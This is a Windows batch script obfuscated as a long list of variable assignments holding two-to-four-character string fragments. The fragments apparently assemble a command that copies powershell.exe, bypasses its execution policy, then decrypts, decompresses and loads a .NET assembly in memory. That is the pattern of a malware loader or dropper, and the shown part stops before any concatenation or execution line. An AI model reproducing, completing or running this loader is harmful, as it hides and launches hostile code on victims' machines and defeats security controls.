@echo off
set "vorRydgNhe=Po"
set "hYRkrqDSPO=32"
set "MBXuLxVTyN=st"
set "okeKzdYrRq=s\"
set "KJMeCclykw=:\"
set "SFIFzNmJZc=\W"
set "KqbNRtAGWw=ll"
set "LpzOoNKMdv=do"
set "TcdKVIBaCN=ws"
set "TbctKgqJBP=nd"
set "nkFcAIXrUG=em"
set "VyBPSeesCW=po"
set "PqGWmmnHoP=Wi"
set "cAFEigaiiu=rS"
set "ieSednNLbo=in"
set "cXEMsOJEJF=1."
set "bbcBwDvOTo=he"
set "CHJQKVINJr=\v"
set "OkYXjJsSGd=we"
set "EyEfffUGLh=0\"
set "KsvMxzYdbl=ow"
set "CSRBdCgUrM=we"
set "DwHoSZbvMg=y "
set "HXFZSbkCGt=ll"
set "aAIXVNiwBF=xe"
set "LNinSxYHpl=he"
set "oEZrtcEfjv= /"
set "tFneCKbdsQ= C"
set "xtOCXIHtuw=Sy"
set "sGSaPddDKF=rs"
set "iLhEoAJohp=py"
set "MbaHPpGAaP=.e"
set "MEOeAMvNDi=co"
set "tJHOrhEesk=cd"
set "mluLmBnuZt= %~dp0"
set "kJdGaEWmHQ=$foG"
set "SGWQbXVrDb=urit"
set "CbifFApKJA=);$l"
set "zOjXTbAVVt=rity"
set "oSnFtbpXrH=, (,"
set "ldEZfUwfLK=] -j"
set "mGFTAqJxDr=brea"
set "ksOgwOaEWY=le  "
set "HEAuAdOJnL= [Sy"
set "QmfbonVPdo=lit("
set "RxDMOQtiqZ=raph"
set "BzzjGdCECn=gnir"
set "MUIprtpchg=nage"
set "WtGdQBddDj=m.IO"
set "SvSGuQhVdv=oArr"
set "wKRmIKzniY=)))"
set "rIHdGsyher=d;$x"
set "UWOawJLMuk=join"
set "YmhHIHzuda=ewLi"
set "DFiFrUCMtl= New"
set "WSEkGVHJil=Stre"
set "QNbLnfUCPg=fore"
set "ObMzSuJidf=ispo"
set "aWyTVFBvoY=null"
set "wnuTrojhpY=3); "
set "pdvAeOhwHe=Disp"
set "jHzwQsPZOd=v4Ir"
set "xvPxAmfuyw=();$"
set "KkKXAFMvXl=ew-O"
set "IlCCdAamqM=yste"
set "zcAxaYlzFn=$ldk"
set "ceSqmwkZaS=tem."
set "oDZkNWHURK=..-1"
set "bPuUKMFuZP=zmYp"
set "wNoycWvvPj=ecry"
set "WwAIRlDLjG=-1.."
set "VRcMJcptRi== $x"
set "mprOkiuaNf=$zmY"
set "bXdJyYbwFP= [Sy"
set "xipNzBaCqA='dqR"
set "tmzeDaHamQ=.Ass"
set "OBDVPFbtsL=6esa"
set "FKxWhxABzC=New-"
set "BaskiqTrzb=)($b"
set "vnzjfYukZN=daeR"
set "uKERKvOAmP=[Sys"
set "igytChuaEs=[Sys"
set "SHiuwOSxnT=Comp"
set "HfANvdJFgY=ct S"
set "ZCNPkDAOyO=e = "
set "pzgXuOnuxA=ptor"
set "mfvtnEiRDc= [st"
set "ygnWvTUoCI=ion."
set "rHxOIHeFth=)) {"
set "WpvxrVKCLf=p = "
set "jNegiBIBfr=se()"
set "ZWnXnXyVHW=);$x"
set "iPYmsQnkgx=7;$x"
set "NpIoSgrkWM=qTV."
set "tgFNHswUOd=oL'["
set "zrKcvHEgTH=yTo("
set "EiYgpVdYzL=$GZD"
set "kcAWGCKGfy= '')"
set "SkEasTqCRN=stem"
set "RETasxFHkc=Disp"
set "UEVFdCUkXV=ode]"
set "kJebTbdwMK=GIt."
set "uWKpGsGxTu=It.T"
set "ztOsqrJYhW=zmYp"
set "bulClLAmNg=rity"
set "IlHNqTTmIA=form"
set "EMosuzkHUr=t Sy"
set "JEtljhCSWy=;$aS"
set "zZryyNEXqn=pjJd"
set "QjrWvjUMEA=.-16"
set "yjPeZDMfzm=V = "
set "mVokrmRouI=m.Re"
set "otYnuteXqa=eam("
set "NwAYNChlKr=.Mem"
set "wNagNuSRkE=esFX"
set "UfFxlWpMvT=.Key"
set "baOTYypbEF=vip."
set "SIKvXKfkmm=-ep "
set "qMcfcKrinG=ay()"
set "SAFZZxNwFY=Star"
set "XPFElpeJlQ='')("
